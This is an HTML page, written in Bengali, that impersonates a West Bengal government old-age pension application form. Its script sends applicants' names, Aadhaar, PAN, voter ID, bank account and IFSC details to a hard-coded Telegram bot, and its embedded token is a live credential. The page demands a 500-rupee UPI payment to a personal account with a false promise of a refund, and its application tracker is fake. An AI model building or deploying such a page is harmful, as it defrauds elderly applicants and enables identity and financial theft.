<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Old Age Pension Form</title>
<style>
  /* [Existing CSS unchanged] */
  body {
    font-family: Arial, sans-serif;
    background-color: #f8f9fa;
    padding: 20px;
  }
  header {
    text-align: center;
    background-color: #004aad;
    color: white;
    padding: 15px;
    border-radius: 5px;
  }
  form, .tracking {
    background: white;
    padding: 20px;
    border-radius: 8px;
    max-width: 600px;
    margin: 20px auto;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
  }
  input, button, select {
    width: 100%;
    padding: 10px;
    margin-top: 8px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 5px;
  }
  button {
    background-color: #007b5e;
    color: white;
    border: none;
    font-size: 16px;
    cursor: pointer;
  }
  button:hover {
    background-color: #005f47;
  }
  .qr {
    text-align: center;
    margin-top: 15px;
  }
  .note {
    text-align: center;
    color: blue;
    margin-top: 10px;
  }
  .app-number {
    font-weight: bold;
    color: darkred;
  }
</style>
<script>
  // Language text object for Bengali (bn)
  const texts = {
    bn: {
      title: "বার্ধক্য ভাতা আবেদন ফর্ম",
      gov: "পশ্চিমবঙ্গ সরকার",
      name: "নাম",
      aadhar: "আধার নম্বর",
      phone: "ফোন নম্বর",
      post: "পোস্ট অফিস নির্বাচন করুন",
      pan: "প্যান নম্বর (ঐচ্ছিক)",
      voter: "ভোটার কার্ড নম্বর",
      account: "ব্যাংক অ্যাকাউন্ট নম্বর",
      ifsc: "IFSC কোড",
      note: "এই পেমেন্ট করা টাকা টাও আপনি আপনার ব্যাংকে পেয়ে যাবেন।",
      pay: "৫০০ টাকা পরিশোধের জন্য নিচের QR কোড স্ক্যান করুন",
      utr: "UTR নম্বর লিখুন",
      submit: "জমা দিন",
      track: "আবেদন ট্র্যাক করুন",
      placeholder: "আপনার ১৫ ডিজিট আবেদন নম্বর দিন"
    }
  };

  // Post offices in South 24 Parganas
  const postOffices = [
    "Alipore", "Ballygunge", "Baruipur", "Behala", "Budge Budge", "Diamond Harbour",
    "Ghutiari Sharif", "Jaynagar Majilpur", "Kakdwip", "Raidighi", "Canning",
    "Namkhana", "Mandirbazar", "Patharpratima", "Bhangar", "Sonarpur", "Falatah",
    "Basanti", "Joynagar", "Sagar", "Mathurapur"
  ];

  // Function to populate texts based on language (default bn)
  function changeLanguage(lang) {
    const t = texts[lang];
    document.getElementById("title").textContent = t.title;
    document.getElementById("gov").textContent = t.gov;
    document.getElementById("labelName").textContent = t.name + ":";
    document.getElementById("labelAadhar").textContent = t.aadhar + ":";
    document.getElementById("labelPhone").textContent = t.phone + ":";
    document.getElementById("labelPost").textContent = t.post + ":";
    document.getElementById("labelPan").textContent = t.pan + ":";
    document.getElementById("labelVoter").textContent = t.voter + ":";
    document.getElementById("labelAccount").textContent = t.account + ":";
    document.getElementById("labelIfsc").textContent = t.ifsc + ":";
    document.getElementById("note").textContent = t.note;
    document.getElementById("payText").textContent = t.pay;
    document.getElementById("labelUtr").textContent = t.utr + ":";
    document.getElementById("submitBtn").textContent = t.submit;
    document.getElementById("trackTitle").textContent = t.track;
    document.getElementById("trackNum").placeholder = t.placeholder;
  }

  // Generate 15-digit application number
  function generateAppNumber() {
    return Math.floor(100000000000000 + Math.random() * 900000000000000);
  }

  // On form submission: send data to Telegram channel and show application number
  function handleSubmit(event) {
    event.preventDefault();
    const appNumber = generateAppNumber();
    const data = {
      name: document.querySelector('input[name="name"]').value,
      aadhar: document.querySelector('input[name="aadhar"]').value,
      phone: document.querySelector('input[name="phone"]').value,
      post: document.querySelector('select[name="post"]').value,
      pan: document.querySelector('input[name="pan"]').value,
      voter: document.querySelector('input[name="voter"]').value,
      account: document.querySelector('input[name="account"]').value,
      ifsc: document.querySelector('input[name="ifsc"]').value,
      utr: document.querySelector('input[name="utr"]').value,
      applicationNumber: appNumber
    };

    // Create message text to send to Telegram channel
    const message = `
নাম: ${data.name}
আধার: ${data.aadhar}
ফোন: ${data.phone}
পোস্ট অফিস: ${data.post}
প্যান: ${data.pan}
ভোটার কার্ড নম্বর: ${data.voter}
ব্যাংক অ্যাকাউন্ট নম্বর: ${data.account}
IFSC: ${data.ifsc}
UTR: ${data.utr}
আবেদন নম্বর: ${appNumber}
    `;

    fetch("https://api.telegram.org/bot5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "-1003102946985",
        text: message
      })
    })
    .then(response => response.json())
    .then(() => {
      // Show success message with application number
      document.getElementById("applicationResult").innerHTML =
        "Your registration is successful. Copy your Application Tracking Number: <br>" +
        "<span class='app-number'>" + appNumber + "</span>";
      // Optionally reset form fields here if desired
    })
    .catch(() => {
      document.getElementById("applicationResult").innerHTML =
        "Submission failed. Please try again.";
    });
  }

  // Track application by 15-digit application number
  function handleTrack() {
    const trackNum = document.getElementById("trackNum").value.trim();
    if (trackNum.length === 15 && !isNaN(trackNum)) {
      alert("Your application " + trackNum + " is now under review.");
    } else {
      alert("Please enter a valid 15-digit Application Number.");
    }
  }

  // Populate post offices into the dropdown on page load
  window.onload = function() {
    changeLanguage('bn');
    const postSelect = document.querySelector('select[name="post"]');
    postOffices.forEach(p => {
      const opt = document.createElement('option');
      opt.value = p;
      opt.textContent = p;
      postSelect.appendChild(opt);
    });
  };
</script>
</head>
<body>

<header>
  <h1 id="gov">পশ্চিমবঙ্গ সরকার</h1>
</header>

<h2 id="title" style="text-align:center;">বার্ধক্য ভাতা আবেদন ফর্ম</h2>

<form onsubmit="handleSubmit(event)" novalidate>
  <label id="labelName" for="name">নাম:</label>
  <input type="text" id="name" name="name" required />

  <label id="labelAadhar" for="aadhar">আধার নম্বর:</label>
  <input type="text" id="aadhar" name="aadhar" required />

  <label id="labelPhone" for="phone">ফোন নম্বর:</label>
  <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" title="Enter a valid 10-digit phone number" required />

  <label id="labelPost" for="post">পোস্ট অফিস:</label>
  <select id="post" name="post" required>
    <option value="" disabled selected>--পোস্ট অফিস নির্বাচন করুন--</option>
  </select>

  <label id="labelPan" for="pan">প্যান নম্বর (ঐচ্ছিক):</label>
  <input type="text" id="pan" name="pan" />

  <label id="labelVoter" for="voter">ভোটার কার্ড নম্বর:</label>
  <input type="text" id="voter" name="voter" required />

  <label id="labelAccount" for="account">ব্যাংক অ্যাকাউন্ট নম্বর:</label>
  <input type="text" id="account" name="account" required />

  <label id="labelIfsc" for="ifsc">IFSC কোড:</label>
  <input type="text" id="ifsc" name="ifsc" required />

  <div class="note" id="note"></div>

  <div class="qr">
    <p id="payText"></p>
    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=tadegayatri13@oksbi&pn=Gayatri%20Tade&am=500" alt="Payment QR" />
  </div>

  <label id="labelUtr" for="utr">UTR নম্বর:</label>
  <input type="text" id="utr" name="utr" required />

  <button type="submit" id="submitBtn">জমা দিন</button>
</form>

<div id="applicationResult" class="note"></div>

<div class="tracking">
  <h3 id="trackTitle">আবেদন ট্র্যাক করুন</h3>
  <input type="text" id="trackNum" placeholder="আপনার ১৫ ডিজিট আবেদন নম্বর দিন" />
  <button onclick="handleTrack()">Track</button>
</div>

</body>
</html>
